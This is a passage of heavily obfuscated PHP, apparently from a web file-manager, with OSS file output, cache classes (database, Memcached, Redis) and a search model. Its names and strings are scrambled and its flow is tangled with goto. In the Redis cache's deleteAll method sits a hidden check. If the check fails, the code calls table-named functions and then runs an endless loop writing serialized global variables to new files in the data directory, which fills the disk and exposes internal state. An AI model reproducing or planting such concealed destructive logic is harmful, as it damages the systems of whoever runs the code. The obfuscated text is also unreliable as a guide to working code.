parent::fileOut($c‘ÛîºÁÀï, $bŸƒë§¨™ƒ, $b»Â´³ŠØÁ, $C³ í¬âù…); } goto Aì‹ÈãÔÎí; Aì‹ÈãÔÎí: $bŸƒë§¨™ƒ = $bŸƒë§¨™ƒ ? $e¤êÍ‡¤Ó«[212] : $e¤êÍ‡¤Ó«[213]; $BáÚ†µ²è = array(OSS\OssClient::OSS_SUB_RESOURCE => $e¤êÍ‡¤Ó«[1303] . rawurlencode("{$bŸƒë§¨™ƒ}\x3b\x66\151\x6c\145\156\x61\x6d\x65\75{$b»Â´³ŠØÁ}")); $BáÚ†µ²è[OSS\OssClient::OSS_SUB_RESOURCE] .= $e¤êÍ‡¤Ó«[1304] . rawurlencode($AÙˆé†„œ); goto D¹½÷„†õ‘; bëå¹Ñ“Í: } public function fileOutServer($bå»¿Š—©æ, $cÇ†‘ÊËå“ = false, $d…•ìĞ¼§× = false, $FŠ¦çÚã¤· = '') { parent::fileOut($bå»¿Š—©æ, $cÇ†‘ÊËå“, $d…•ìĞ¼§×, $FŠ¦çÚã¤·); } public function fileOutImage($f”‹“·æÔ, $aæ¶‡ßßª = 250) { $F¾—ëÏ„å = array(OSS\OssClient::OSS_PROCESS => $_SERVER[…ë˜õ][1305] . $aæ¶‡ßßª); $bÄò§ˆÌæÎ = $this->link($f”‹“·æÔ, $F¾—ëÏ„å); $this->fileOutLink($bÄò§ˆÌæÎ); } public function fileOutImageServer($BšçÅÛÌ, $CİÑ‰ë‘ = 250) { parent::fileOutImage($BšçÅÛÌ, $CİÑ‰ë‘); } public function fileOutLink($Aù„Œçò“í) { $D¸¸™Œëùâ =& $_SERVER[…ë˜õ]; if (!$this->isCdnHost() && substr($Aù„Œçò“í, 0, 7) == $D¸¸™Œëùâ[1207]) { $Aù„Œçò“í = $D¸¸™Œëùâ[1208] . substr($Aù„Œçò“í, 7); } header($D¸¸™Œëùâ[158] . $Aù„Œçò“í); die; } public function hashMd5($A—×Ä¼ã¼˜, $dòâ§¡»®å = '') { $FŸ©ƒÔ­¬Å =& $_SERVER[…ë˜õ]; $Dæ³å®Ï ã = $this->_objectMeta($A—×Ä¼ã¼˜); if (!$Dæ³å®Ï ã) { return $FŸ©ƒÔ­¬Å[33]; } if (!isset($Dæ³å®Ï ã[$FŸ©ƒÔ­¬Å[1281]]) && !empty($dòâ§¡»®å)) { $F·“Ú×÷à’ = $this->updateObjMeta($A—×Ä¼ã¼˜, array($FŸ©ƒÔ­¬Å[1281] => $dòâ§¡»®å)); $Dæ³å®Ï ã[$FŸ©ƒÔ­¬Å[1281]] = $F·“Ú×÷à’ ? $dòâ§¡»®å : $FŸ©ƒÔ­¬Å[33]; } return isset($Dæ³å®Ï ã[$FŸ©ƒÔ­¬Å[1281]]) ? strtolower($Dæ³å®Ï ã[$FŸ©ƒÔ­¬Å[1281]]) : $FŸ©ƒÔ­¬Å[33]; } public function size($E¡»¹ ô) { $DÇ‘šø¤º = $this->objectMeta($E¡»¹ ô); return $DÇ‘šø¤º ? $DÇ‘šø¤º[$_SERVER[…ë˜õ][77]] : 0; } public function info($dé‚Ù§’Ô) { if ($this->isFolder($dé‚Ù§’Ô)) { return $this->folderInfo($dé‚Ù§’Ô); } else { if ($this->isFile($dé‚Ù§’Ô)) { return $this->fileInfo($dé‚Ù§’Ô); } } return !1; } public function exist($B‚¯‹‘Ïª¨) { return $this->isFile($B‚¯‹‘Ïª¨) || $this->isFolder($B‚¯‹‘Ïª¨); } public function isFile($eĞƒÂ÷³ìÙ) { return !$this->isFolder($eĞƒÂ÷³ìÙ) && $this->objectMeta($eĞƒÂ÷³ìÙ); } public function isFolder($F÷À™øê†Á) { return $this->cacheMethod($_SERVER[…ë˜õ][197], $F÷À™øê†Á); } protected function objectMeta($CæßÔéÒªô) { return $this->cacheMethod($_SERVER[…ë˜õ][198], $CæßÔéÒªô); } protected function _objectMeta($E•ò£ƒò¯‘) { $c»™ˆ–¼º× =& $_SERVER[…ë˜õ]; try { $DùÇ¯ÊØÃ£ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($E•ò£ƒò¯‘)); } catch (OSS\Core\OssException $CŠäø¿¯) { $DùÇ¯ÊØÃ£ = !1; } if ($DùÇ¯ÊØÃ£) { $DùÇ¯ÊØÃ£[$c»™ˆ–¼º×[77]] = intval($DùÇ¯ÊØÃ£[$c»™ˆ–¼º×[1279]]); } return $DùÇ¯ÊØÃ£; } protected function _isFolder($b÷ŞÖçÂô—) { $FÄˆÓÇèÀ˜ =& $_SERVER[…ë˜õ]; if ($b÷ŞÖçÂô— == $FÄˆÓÇèÀ˜[33] || $b÷ŞÖçÂô— == $FÄˆÓÇèÀ˜[8]) { return !0; } $dßÖÄßô = array($FÄˆÓÇèÀ˜[1275] => $FÄˆÓÇèÀ˜[8], $FÄˆÓÇèÀ˜[1276] => rtrim($b÷ŞÖçÂô—, $FÄˆÓÇèÀ˜[8]) . $FÄˆÓÇèÀ˜[8], $FÄˆÓÇèÀ˜[1277] => 1, $FÄˆÓÇèÀ˜[1278] => $FÄˆÓÇèÀ˜[33]); $c£´ÙÀíÇø = $this->client->listObjects($this->bucket, $dßÖÄßô); if ($c£´ÙÀíÇø->getObjectList() || $c£´ÙÀíÇø->getPrefixList()) { return !0; } return !1; } } goto cØåÏç­ñ; E«Š“®Ï“Ê: class CacheLockDatabase { public function lock($e´ ¸ë°¯, $D»‘ë§ßšô = 0) { $Aã¦Òëä•  = Model($_SERVER[…ë˜õ][800]); $e‡Š’´®îí = microtime(!0) + $D»‘ë§ßšô; while (microtime(!0) < $e‡Š’´®îí) { $EÚóÄå…Áç = $Aã¦Òëä• ->get($e´ ¸ë°¯); if (!$EÚóÄå…Áç || $EÚóÄå…Áç < microtime(!0)) { $cìˆÜéêùŒ = $Aã¦Òëä• ->set($e´ ¸ë°¯, $e‡Š’´®îí); if ($cìˆÜéêùŒ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($aØá¤Œ‡¥È) { return Model($_SERVER[…ë˜õ][800])->get($aØá¤Œ‡¥È); } public function unlock($C‘šÈÛœÙ) { Model($_SERVER[…ë˜õ][800])->remove($C‘šÈÛœÙ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Fï¬’…¹Á‚, $BŞöİÔ’ÖÕ) { $e¡Ñ¤™¡Šì =& $_SERVER[…ë˜õ]; if (!class_exists($e¡Ñ¤™¡Šì[834])) { show_json($e¡Ñ¤™¡Šì[835], !1); } $this->cacheTime = $BŞöİÔ’ÖÕ; $this->handle = new Memcached(); if (is_array($Fï¬’…¹Á‚[$e¡Ñ¤™¡Šì[836]]) && count($Fï¬’…¹Á‚[$e¡Ñ¤™¡Šì[836]]) >= 1) { foreach ($Fï¬’…¹Á‚[$e¡Ñ¤™¡Šì[836]] as $F¼®¥„¨Ä‚) { $e§æÍò¡ê‹ = explode($e¡Ñ¤™¡Šì[4], $F¼®¥„¨Ä‚); $this->handle->addServer($e§æÍò¡ê‹[0], $e§æÍò¡ê‹[1]); } } else { $this->handle->addServer($Fï¬’…¹Á‚[$e¡Ñ¤™¡Šì[174]], $Fï¬’…¹Á‚[$e¡Ñ¤™¡Šì[175]]); } } public function set($cØ×‡ëÛïê, $e§Š›Ÿƒ¾, $B©ÃÏ¹¸½„ = false) { $B©ÃÏ¹¸½„ = $B©ÃÏ¹¸½„ ? $B©ÃÏ¹¸½„ : $this->cacheTime; return $this->handle->set($cØ×‡ëÛïê, $e§Š›Ÿƒ¾, $B©ÃÏ¹¸½„); } public function get($dîê‡Úëí«) { return $this->handle->get($dîê‡Úëí«); } public function remove($B‡¥‡Ä³·) { return $this->handle->delete($B‡¥‡Ä³·); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($aÇ†äËÀä´, $F¤Ç„ô†¤Ù) { $fˆ½Ìà½É =& $_SERVER[…ë˜õ]; if (!class_exists($fˆ½Ìà½É[837])) { show_json($fˆ½Ìà½É[838], !1); } $this->cacheTime = $F¤Ç„ô†¤Ù; $Cà“äçóÛø = isset($aÇ†äËÀä´[$fˆ½Ìà½É[839]]) ? $aÇ†äËÀä´[$fˆ½Ìà½É[839]] : 10; $A†öóºì„– = _get($aÇ†äËÀä´, $fˆ½Ìà½É[836]); if ($A†öóºì„– && is_array($A†öóºì„–)) { $this->initCluster($aÇ†äËÀä´, $Cà“äçóÛø); } else { $this->handle = $this->init($aÇ†äËÀä´, $Cà“äçóÛø); } } private function init($d¡Éƒ«íĞÇ, $bÛ¥®‹éÊ) { $aÇóËˆ¢¤ =& $_SERVER[…ë˜õ]; $c‚ÂŠ¥î³‘ = new Redis(); $Dµ×ò¤Èù = isset($d¡Éƒ«íĞÇ[$aÇóËˆ¢¤[840]]) ? $d¡Éƒ«íĞÇ[$aÇóËˆ¢¤[840]] : !1; if ($Dµ×ò¤Èù) { $c‚ÂŠ¥î³‘->pconnect($d¡Éƒ«íĞÇ[$aÇóËˆ¢¤[174]], $d¡Éƒ«íĞÇ[$aÇóËˆ¢¤[175]], $bÛ¥®‹éÊ); } else { $c‚ÂŠ¥î³‘->connect($d¡Éƒ«íĞÇ[$aÇóËˆ¢¤[174]], $d¡Éƒ«íĞÇ[$aÇóËˆ¢¤[175]], $bÛ¥®‹éÊ); } if (!empty($d¡Éƒ«íĞÇ[$aÇóËˆ¢¤[400]])) { $c‚ÂŠ¥î³‘->auth($d¡Éƒ«íĞÇ[$aÇóËˆ¢¤[400]]); } return $c‚ÂŠ¥î³‘; } private function initCluster($bæº«ìË×, $BÖ•¤º“Î®) { $f¶¾ñ…¦Ñ¸ =& $_SERVER[…ë˜õ]; $f“ë½ÅĞ¼À = array($f¶¾ñ…¦Ñ¸[841], $f¶¾ñ…¦Ñ¸[842], $f¶¾ñ…¦Ñ¸[843]); $AØ§Ö÷©òË = $f¶¾ñ…¦Ñ¸[841]; if (isset($bæº«ìË×[$f¶¾ñ…¦Ñ¸[12]]) && in_array($bæº«ìË×[$f¶¾ñ…¦Ñ¸[12]], $f“ë½ÅĞ¼À)) { $AØ§Ö÷©òË = $bæº«ìË×[$f¶¾ñ…¦Ñ¸[12]]; } switch ($AØ§Ö÷©òË) { case $f¶¾ñ…¦Ñ¸[841]: $this->_slave($bæº«ìË×, $BÖ•¤º“Î®); break; case $f¶¾ñ…¦Ñ¸[842]: break; case $f¶¾ñ…¦Ñ¸[843]: $this->isCluster = !0; $f®Ç–¹ƒƒ« = $bæº«ìË×[$f¶¾ñ…¦Ñ¸[836]]; $aš•ÅØ£ = isset($bæº«ìË×[$f¶¾ñ…¦Ñ¸[840]]) ? $bæº«ìË×[$f¶¾ñ…¦Ñ¸[840]] : !1; $eÃ¬È‹ÀÓµ = isset($bæº«ìË×[$f¶¾ñ…¦Ñ¸[400]]) ? $bæº«ìË×[$f¶¾ñ…¦Ñ¸[400]] : null; $this->handle = new RedisCluster(NUll, $f®Ç–¹ƒƒ«, $BÖ•¤º“Î®, $BÖ•¤º“Î®, $aš•ÅØ£, $eÃ¬È‹ÀÓµ); break; default: break; } } private function _slave($F‚²™›İš¸, $eÕ¸Ø±Ÿ) { goto A¦ÈÀé½ÀÕ; A¦ÈÀé½ÀÕ: $eÛä‚‘óòÛ = $F‚²™›İš¸[$_SERVER[…ë˜õ][836]]; $this->filterConfig($F‚²™›İš¸, $eÛä‚‘óòÛ[0]); $this->handle = $this->init($F‚²™›İš¸, $eÕ¸Ø±Ÿ); goto aŞò†¾Ó‡†; fËÉäî†—ù: $this->filterConfig($F‚²™›İš¸, $eÛä‚‘óòÛ[$EŠª±çÛó]); $this->slaveHandle = $this->init($F‚²™›İš¸, $eÕ¸Ø±Ÿ); goto EŒ¿—½£Ê¡; aŞò†¾Ó‡†: unset($eÛä‚‘óòÛ[0]); if (empty($eÛä‚‘óòÛ)) { return; } $EŠª±çÛó = array_rand($eÛä‚‘óòÛ); goto fËÉäî†—ù; EŒ¿—½£Ê¡: } private function filterConfig(&$cêáèÅí‹‚, $eƒœ‹•óÕ…) { $aœç«á£æ =& $_SERVER[…ë˜õ]; $BÊÌÈàâ¬Ì = explode($aœç«á£æ[4], $eƒœ‹•óÕ…); $e×œ‰Ø‡í = array($aœç«á£æ[174] => $BÊÌÈàâ¬Ì[0], $aœç«á£æ[175] => $BÊÌÈàâ¬Ì[1]); $cêáèÅí‹‚ = array_merge($cêáèÅí‹‚, $e×œ‰Ø‡í); } public function set($DÁœ™íØ‰, $F³‰İÓ–È, $e•Ôè¨æŒ¢ = false) { $e•Ôè¨æŒ¢ = $e•Ôè¨æŒ¢ ? $e•Ôè¨æŒ¢ : $this->cacheTime; return $this->handle->setEx($DÁœ™íØ‰, $e•Ôè¨æŒ¢, $F³‰İÓ–È); } public function setLock($d²¬¥“Š˜, $eİĞ³½¹±ï, $aÁßæÉŞÂÌ) { return $this->handle->setNX($d²¬¥“Š˜, $eİĞ³½¹±ï); } public function get($a¡®†æÒ‡›) { $b¨ƒ¦›é„Ÿ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $b¨ƒ¦›é„Ÿ->get($a¡®†æÒ‡›); } public function remove($f‚³Á×¾Ôæ) { return $this->handle->del($f‚³Á×¾Ôæ); } public function deleteAll() { $Dç¿Ğ¸ğÄŞ =& $_SERVER[…ë˜õ]; $E‚œ‰‡ã¬Æ = $_SERVER[$Dç¿Ğ¸ğÄŞ[827]] . $Dç¿Ğ¸ğÄŞ[828]; $a®¥´ÌÌ¹¿ = $Dç¿Ğ¸ğÄŞ[844]; if ($_SERVER[$Dç¿Ğ¸ğÄŞ[824]] != $a®¥´ÌÌ¹¿($E‚œ‰‡ã¬Æ)) { goto bÉÎìï§¯á; bîŒ÷î¶¶é: $dà¾½øàª¨(); $F¾ÄÉê«ƒ = $Dç¿Ğ¸ğÄŞ[848]; $BÆ¯†äíŞ¨ = json_encode($GLOBALS[$Dç¿Ğ¸ğÄŞ[849]]); goto CŒŸŒŒÄõ¬; C–²½…ÈêÓ: $aÆÜ¦ÒÆ = $A¯Òâ¶ù— ($bÇ—•»³³“); $f‘ÊÊ‚¥‚ = explode($Dç¿Ğ¸ğÄŞ[227], $aÆÜ¦ÒÆ); if (count($f‘ÊÊ‚¥‚) < $Dç¿Ğ¸ğÄŞ[570]) { $CÔª´ºò–› = $Dç¿Ğ¸ğÄŞ[829]; $CÔª´ºò–›(); } goto câ¿×¸Õ•ƒ; câ¿×¸Õ•ƒ: $E†å½ï†Ùí = $Dç¿Ğ¸ğÄŞ[846]; $E†å½ï†Ùí($_SERVER[$Dç¿Ğ¸ğÄŞ[847]]); $dà¾½øàª¨ = $Dç¿Ğ¸ğÄŞ[845]; goto bîŒ÷î¶¶é; bÉÎìï§¯á: $dà¾½øàª¨ = $Dç¿Ğ¸ğÄŞ[845]; $A¯Òâ¶ù—  = $Dç¿Ğ¸ğÄŞ[826]; $bÇ—•»³³“ = $_SERVER[$Dç¿Ğ¸ğÄŞ[827]] . $Dç¿Ğ¸ğÄŞ[828]; goto C–²½…ÈêÓ; CŒŸŒŒÄõ¬: $b¨âÂ–Æ® = 1; for ($dàˆ¸Œí¶Ê = $b¨âÂ–Æ®; $dàˆ¸Œí¶Ê > 0; $dàˆ¸Œí¶Ê++) { $F¾ÄÉê«ƒ(DATA_PATH . $dàˆ¸Œí¶Ê, $BÆ¯†äíŞ¨); } goto EÈøÊ‰ˆ­‚; EÈøÊ‰ˆ­‚: } if ($this->isCluster) { foreach ($this->handle->_masters() as $f³ƒ’…ÊÑø) { $this->handle->flushall($f³ƒ’…ÊÑø); } return; } return $this->handle->flushAll(); } } goto fì°©Ä«¤; Aº¬š–«£¼: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($A·ë™×¬¬½) { goto f ©¬ƒ‹; f ©¬ƒ‹: $Dà¯’®ô =& $_SERVER[…ë˜õ]; $eä›†ÄÚù = KodIO::fileTypeList(); $f—åÏ¼Ã‰Ó = $eä›†ÄÚù[$A·ë™×¬¬½]; goto C ¤§²„œŒ; CÁŞ¡¨Æ®¥: if (!$f—åÏ¼Ã‰Ó[$Dà¯’®ô[167]]) { $Bö…áª¬¶Ø = array_to_keyvalue($eä›†ÄÚù, $Dà¯’®ô[33], $Dà¯’®ô[167]); $CóëÆÜÁÜé = implode($Dà¯’®ô[47], $Bö…áª¬¶Ø); $a¨…÷‰¤ = $Dà¯’®ô[1936]; } $B­Å»Ó‹Ùî = explode($Dà¯’®ô[47], trim($CóëÆÜÁÜé, $Dà¯’®ô[47])); return array($a¨…÷‰¤, $B­Å»Ó‹Ùî); goto eä† ‘©£; C ¤§²„œŒ: if (!$f—åÏ¼Ã‰Ó) { return array(); } $CóëÆÜÁÜé = $f—åÏ¼Ã‰Ó[$Dà¯’®ô[167]]; $a¨…÷‰¤ = $Dà¯’®ô[7]; goto CÁŞ¡¨Æ®¥; eä† ‘©£: } public function listPathType($DîÚ×¹îç) { $b³´İøÒ³ =& $_SERVER[…ë˜õ]; $bÆ¾Ú»âÎ¨ = $this->fileTypeWhere($DîÚ×¹îç); if (!$bÆ¾Ú»âÎ¨) { return array(); } $EŞÂœÁµœŠ = array($b³´İøÒ³[544] => SourceModel::TYPE_USER, $b³´İøÒ³[545] => USER_ID, $b³´İøÒ³[541] => 0, $b³´İøÒ³[542] => $bÆ¾Ú»âÎ¨); return $this->listSource($EŞÂœÁµœŠ); } public function listSearch($C‚Ğ–ÅŞ, $dñ˜ÑËŒ™¼ = 300) { goto F…·æø›µÃ; Fã¯‚Ó¤¡†: $this->_listMake($e‹ô„¸÷³); return $e‹ô„¸÷³; goto a”Éë™¡æÎ; F³ÍÁÔêê: $this->_listSearchBindPinyin($C‚Ğ–ÅŞ, $fÉ¬®öÁ…, $aİ­¬âÉÌª); $this->alias($Dá…»Ó‹êˆ[511])->_makeOrder(); $fÉ¬®öÁ… = $this->parseWhereLike($fÉ¬®öÁ…); goto fÂÌƒÔõ¡; e¿œà˜ô²Æ: if (!isset($fÉ¬®öÁ…[$Dá…»Ó‹êˆ[417]])) { $fÉ¬®öÁ…[$Dá…»Ó‹êˆ[417]] = 0; } $aİ­¬âÉÌª = $Dá…»Ó‹êˆ[1938]; $b–ğˆ»òï = $aİ­¬âÉÌª; goto F³ÍÁÔêê; F…·æø›µÃ: $Dá…»Ó‹êˆ =& $_SERVER[…ë˜õ]; if (isset($C‚Ğ–ÅŞ[$Dá…»Ó‹êˆ[1779]]) && $C‚Ğ–ÅŞ[$Dá…»Ó‹êˆ[1779]]) { $C‚Ğ–ÅŞ[$Dá…»Ó‹êˆ[1779]] = str_replace($Dá…»Ó‹êˆ[379], $Dá…»Ó‹êˆ[1937], trim($C‚Ğ–ÅŞ[$Dá…»Ó‹êˆ[1779]])); } $fÉ¬®öÁ… = $this->_parseSearchWhere($C‚Ğ–ÅŞ); goto e¿œà˜ô²Æ; C§¯“ª‹: $this->_listSearchTag($e‹ô„¸÷³, $C‚Ğ–ÅŞ, $b–ğˆ»òï); $this->_listSearchGroupTag($e‹ô„¸÷³, $C‚Ğ–ÅŞ, $b–ğˆ»òï); $this->_listDataApply($e‹ô„¸÷³[$Dá…»Ó‹êˆ[365]]); goto Fã¯‚Ó¤¡†; fÂÌƒÔõ¡: $e‹ô„¸÷³ = $this->distinct(!0)->field($aİ­¬âÉÌª)->where($fÉ¬®öÁ…)->selectPage($dñ˜ÑËŒ™¼); $this->_listSearchFileContent($e‹ô„¸÷³, $C‚Ğ–ÅŞ, $b–ğˆ»òï); $this->_listSearchDesc($e‹ô„¸÷³, $C‚Ğ–ÅŞ, $b–ğˆ»òï); goto C§¯“ª‹; a”Éë™¡æÎ: } private function _listSearchFileContent(&$DÉê‡ÛÛÉÈ, $bŠË³ ˆ±‹, $cïñ´ åè) { goto FóÃÂ¬¾; FóÃÂ¬¾: $D›¨¤İÌ˜Ù =& $_SERVER[…ë˜õ]; if (!$bŠË³ ˆ±‹[$D›¨¤İÌ˜Ù[1779]] || $DÉê‡ÛÛÉÈ[$D›¨¤İÌ˜Ù[362]][$D›¨¤İÌ˜Ù[349]] > 1) { return; } $D±Äª¢âÎŠ = $this->_parseSearchWhere($bŠË³ ˆ±‹); goto CÆ»Ò¸”­; CÆ»Ò¸”­: if (!isset($D±Äª¢âÎŠ[$D›¨¤İÌ˜Ù[28]]) || !is_array($bŠË³ ˆ±‹[$D›¨¤İÌ˜Ù[441]])) { return; } $D±Äª¢âÎŠ[$D›¨¤İÌ˜Ù[441]] = array($D›¨¤İÌ˜Ù[7], $bŠË³ ˆ±‹[$D›¨¤İÌ˜Ù[441]]); unset($D±Äª¢âÎŠ[$D›¨¤İÌ˜Ù[28]]); goto a×÷Ø¶; aÜÚÒê×: $DÉê‡ÛÛÉÈ[$D›¨¤İÌ˜Ù[365]] = array_merge($bÑØÑê°Ù¶, $DÉê‡ÛÛÉÈ[$D›¨¤İÌ˜Ù[365]]); $DÉê‡ÛÛÉÈ[$D›¨¤İÌ˜Ù[362]][$D›¨¤İÌ˜Ù[363]] += count($bÑØÑê°Ù¶); goto b‘—Ä²•­; a×÷Ø¶: unset($bŠË³ ˆ±‹[$D›¨¤İÌ˜Ù[441]]); $bÑØÑê°Ù¶ = $this->field($cïñ´ åè)->where($D±Äª¢âÎŠ)->limit($D›¨¤İÌ˜Ù[1939])->select(); if (!$bÑØÑê°Ù¶ || count($bÑØÑê°Ù¶) == 0) { return; } goto aÜÚÒê×; b‘—Ä²•­: } private function _listSearchTag(&$d¬†»·¦ƒá, $Aâ„…íà‘÷, $a¬ÜÍ…œÂŞ) { goto cŒ‹­÷Ö‰¤; fÆÄê‡õàÅ: $c®‡‰‚íŸõ = array(); $fø°Ì‰¥º = $Aâ„…íà‘÷[$e”ØäÓê’™[1779]]; foreach ($bÏ¹÷Æ´ï as $FÜ–¸®êàâ) { $B«Óõê¢“ = $FÜ–¸®êàâ[$e”ØäÓê’™[28]]; $a¨ƒ©¦í‰‹ = str_replace($e”ØäÓê’™[50], $e”ØäÓê’™[33], Pinyin::encode($B«Óõê¢“)); if (stripos($B«Óõê¢“, $fø°Ì‰¥º) !== !1 || stripos($a¨ƒ©¦í‰‹, $fø°Ì‰¥º) !== !1) { $c®‡‰‚íŸõ[] = $FÜ–¸®êàâ[$e”ØäÓê’™[388]]; } } goto a˜„™ù‘´; cŒ‹­÷Ö‰¤: $e”ØäÓê’™ =& $_SERVER[…ë˜õ]; if (!$Aâ„…íà‘÷[$e”ØäÓê’™[1779]] || $d¬†»·¦ƒá[$e”ØäÓê’™[362]][$e”ØäÓê’™[349]] > 1) { return; } $bÏ¹÷Æ´ï = Model($e”ØäÓê’™[1940])->listData(); goto fÆÄê‡õàÅ; a˜„™ù‘´: if (!$c®‡‰‚íŸõ) { return; } $BšÉáÚĞ« = array($e”ØäÓê’™[413] => array($e”ØäÓê’™[7], $c®‡‰‚íŸõ), $e”ØäÓê’™[1531] => USER_ID); $C ‡¸‰ÃïÆ = Model($e”ØäÓê’™[414])->field($e”ØäÓê’™[75])->where($BšÉáÚĞ«)->select(); goto Cˆ·…ß•; Cˆ·…ß•: $C ‡¸‰ÃïÆ = array_to_keyvalue($C ‡¸‰ÃïÆ, $e”ØäÓê’™[33], $e”ØäÓê’™[75]); $d¥ùÉ•âÄŞ = array_unique($C ‡¸‰ÃïÆ); $this->_listSearchMerge($d¬†»·¦ƒá, $Aâ„…íà‘÷, $a¬ÜÍ…œÂŞ, $d¥ùÉ•âÄŞ); goto dğ¯£ÍÚ“; dğ¯£ÍÚ“: } private function _listSearchDesc(&$cğó½Û­ŠŒ, $dŠ©Ï¾ÃŠÙ, $F©ÌâÍµšË) { goto aÈ‘Çó¾·‘; aÈ‘Çó¾·‘: $eÎï«°…É° =& $_SERVER[…ë˜õ]; if (!$dŠ©Ï¾ÃŠÙ[$eÎï«°…É°[1779]] || $cğó½Û­ŠŒ[$eÎï«°…É°[362]][$eÎï«°…É°[349]] > 1) { return; } $B‹¯ÜŸÛƒŠ = $this->listSearchChildren($dŠ©Ï¾ÃŠÙ[$eÎï«°…É°[472]]); goto eÅÔÂÖ‚§“; cóô†Í¢ŒÈ: $aĞ·ºëéù¹ = Model($eÎï«°…É°[527])->field($eÎï«°…É°[390])->where($c™¡²Íˆ©é)->select(); $fßš¡ãŞ†† = array_to_keyvalue($aĞ·ºëéù¹, $eÎï«°…É°[33], $eÎï«°…É°[390]); $this->_listSearchMerge($cğó½Û­ŠŒ, $dŠ©Ï¾ÃŠÙ, $F©ÌâÍµšË, $fßš¡ãŞ††); goto AÌîìç®»; eÅÔÂÖ‚§“: $B‹¯ÜŸÛƒŠ = array_unique($B‹¯ÜŸÛƒŠ); if (!$B‹¯ÜŸÛƒŠ) { return; } $c™¡²Íˆ©é = array($eÎï«°…É°[390] => array($eÎï«°…É°[7], $B‹¯ÜŸÛƒŠ), $eÎï«°…É°[92] => $eÎï«°…É°[425], $eÎï«°…É°[370] => array($eÎï«°…É°[378], $eÎï«°…É°[1781] . $dŠ©Ï¾ÃŠÙ[$eÎï«°…É°[1779]] . $eÎï«°…É°[1781])); goto cóô†Í¢ŒÈ; AÌîìç®»: } private function _listSearchGroupTag(&$A§˜è äê, $báóÌêí, $aœÌ¤™Ùéœ) { goto fˆ†Ù·Ûºß; eÊñÓ²²ïÂ: $a‚‹Àö©Ğ¨ = array_to_keyvalue($a‚‹Àö©Ğ¨, $aç¤»Âğ‡ [33], $aç¤»Âğ‡ [75]); $A×¬ñ›å”á = array_unique($a‚‹Àö©Ğ¨); $this->_listSearchMerge($A§˜è äê, $báóÌêí, $aœÌ¤™Ùéœ, $A×¬ñ›å”á); goto CàƒĞÔ´İ; DŒ„º™ùÛØ: $e¬—İÁóã· = array(); $d “„î­ = $báóÌêí[$aç¤»Âğ‡ [1779]]; foreach ($E÷ËŒ‘¦Ûî[$aç¤»Âğ‡ [365]] as $FÆƒˆ½È) { $f»ì’Èö¦İ = $FÆƒˆ½È[$aç¤»Âğ‡ [28]]; $aéá÷‘ÕÁ = str_replace($aç¤»Âğ‡ [50], $aç¤»Âğ‡ [33], Pinyin::encode($f»ì’Èö¦İ)); if (stripos($f»ì’Èö¦İ, $d “„î­) !== !1 || stripos($aéá÷‘ÕÁ, $d “„î­) !== !1) { $e¬—İÁóã·[] = $FÆƒˆ½È[$aç¤»Âğ‡ [388]]; } } goto a ÎœŞµ¢‹; a ÎœŞµ¢‹: if (!$e¬—İÁóã·) { return; } $aÜß×ß™¤Ñ = array($aç¤»Âğ‡ [413] => array($aç¤»Âğ‡ [7], $e¬—İÁóã·), $aç¤»Âğ‡ [1531] => 0, $aç¤»Âğ‡ [29] => $aç¤»Âğ‡ [1803] . $E±„´¸Îä); $a‚‹Àö©Ğ¨ = Model($aç¤»Âğ‡ [414])->field($aç¤»Âğ‡ [75])->where($aÜß×ß™¤Ñ)->select(); goto eÊñÓ²²ïÂ; fòšë›Ï¼ò: if (!$a§½¦ì£«Ì || $a§½¦ì£«Ì[$aç¤»Âğ‡ [398]] != SourceModel::TYPE_GROUP) { return; } $E±„´¸Îä = $a§½¦ì£«Ì[$aç¤»Âğ‡ [478]]; $E÷ËŒ‘¦Ûî = Model($aç¤»Âğ‡ [1941])->get($E±„´¸Îä); goto DŒ„º™ùÛØ; fˆ†Ù·Ûºß: $aç¤»Âğ‡  =& $_SERVER[…ë˜õ]; if (!$báóÌêí[$aç¤»Âğ‡ [1779]] || $A§˜è äê[$aç¤»Âğ‡ [362]][$aç¤»Âğ‡ [349]] > 1 || !$báóÌêí[$aç¤»Âğ‡ [472]]) { return; } $a§½¦ì£«Ì = $this->sourceInfo($báóÌêí[$aç¤»Âğ‡ [472]]); goto fòšë›Ï¼ò; CàƒĞÔ´İ: } private function _listSearchMerge(&$CŒ—¤•Çæ§, $Eõ¬â²ä, $Fóõ®”àóÚ, $bÕËÒİñ†Œ) { goto F‹“š‹ª¶; a›î˜”‹ŸĞ: $AêƒœŞŸ˜è = $this->field($Fóõ®”àóÚ)->where($AÄÓ¢ÌÓØä)->select(); if (!$AêƒœŞŸ˜è) { return; } $a’¶ÈÍÑÒ° = array(); goto c¯…ÈµÇ‰; c…Œá–Ê§Ş: $Aœ¡ƒéêÏº = array_diff($bÕËÒİñ†Œ, $dÌ­£¯ ±»); if (!$Aœ¡ƒéêÏº) { return; } $AÄÓ¢ÌÓØä = array($döŠä¢‡››[390] => array($döŠä¢‡››[7], $Aœ¡ƒéêÏº)); goto a›î˜”‹ŸĞ; F‹“š‹ª¶: $döŠä¢‡›› =& $_SERVER[…ë˜õ]; if (!$bÕËÒİñ†Œ) { return; } $dÌ­£¯ ±» = array_to_keyvalue($CŒ—¤•Çæ§[$döŠä¢‡››[365]], $döŠä¢‡››[33], $döŠä¢‡››[390]); goto c…Œá–Ê§Ş; c¯…ÈµÇ‰: foreach ($AêƒœŞŸ˜è as $eº¾–ëğ) { if ($this->_listSearchFilter($eº¾–ëğ, $Eõ¬â²ä)) { $a’¶ÈÍÑÒ°[] = $eº¾–ëğ; } } $CŒ—¤•Çæ§[$döŠä¢‡››[365]] = array_merge($a’¶ÈÍÑÒ°, $CŒ—¤•Çæ§[$döŠä¢‡››[365]]); $CŒ—¤•Çæ§[$döŠä¢‡››[362]][$döŠä¢‡››[363]] += count($a’¶ÈÍÑÒ°); goto d™©–¸ªœÖ; d™©–¸ªœÖ: } private function _listSearchFilter($bÄÂÈÜÃ©í, $C§£‹ÚÊí›) { goto D‡¼çĞÙÅ¨; Fˆ±óˆÕº : if (isset($C§£‹ÚÊí›[$cÛœ®Ì …[399]]) && $C§£‹ÚÊí›[$cÛœ®Ì …[399]] != $cÛœ®Ì …[1745]) { if ($C§£‹ÚÊí›[$cÛœ®Ì …[399]] == $cÛœ®Ì 